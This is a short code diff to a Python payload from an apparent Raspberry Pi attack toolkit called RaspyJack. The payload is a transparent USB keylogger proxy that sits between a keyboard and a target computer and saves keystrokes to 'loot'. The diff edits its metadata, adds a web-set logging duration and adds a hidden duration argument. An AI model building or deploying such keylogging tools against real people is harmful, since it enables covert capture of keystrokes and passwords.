@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
 # @name: Transparent USB HID Keylogger Proxy
-# @desc: The Pi sits between a USB keyboard and the target computer.
+# @desc: Proxy an attached USB keyboard through the Pi's HID gadget, mirror keystrokes to the target, and save an authorized keystroke log to loot.
 # @category: usb
 # @danger: true
 # @active: true
 # @web: true
+# @inputs: [{"name":"seconds","label":"Logging duration","type":"number","default":"300"}]
 """
 RaspyJack Payload -- Transparent USB HID Keylogger Proxy
 =========================================================
@@ -502,7 +503,10 @@ def main():
         help="Stop automatically after this many seconds. If omitted, "
              "runs until Ctrl-C.",
     )
+    parser.add_argument("web_duration", nargs="?", type=float, help=argparse.SUPPRESS)
     opts = parser.parse_args()
+    if opts.duration is None:
+        opts.duration = opts.web_duration
 
     gadget_ok = _setup_gadget()
     with lock:
